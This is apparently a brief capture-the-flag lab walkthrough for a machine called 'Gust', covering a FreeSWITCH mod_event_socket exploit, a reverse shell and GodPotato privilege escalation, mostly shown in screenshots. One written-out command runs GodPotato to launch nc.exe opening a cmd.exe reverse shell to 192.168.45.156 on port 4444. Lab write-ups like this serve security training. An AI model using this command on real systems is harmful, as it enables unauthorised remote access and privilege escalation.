# Gust

I start off by scanning for open ports:

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

I don't find anything so i look for exploits for 'FreeSWITCH mod\_event\_socket' and find this:

{% embed url="https://www.exploit-db.com/exploits/47799" %}

<figure><img src="../../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So i reverse shell with a python base64 encoded payload

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Then i transfer file because we have impersonate privilege:

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

and after also transferring nc.exe i run:

```
C:\Temp\GodPotato-NET4.exe -cmd "C:\Temp\nc.exe -e cmd.exe 192.168.45.156 4444"
```

<figure><img src="../../../../.gitbook/assets/image (4) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
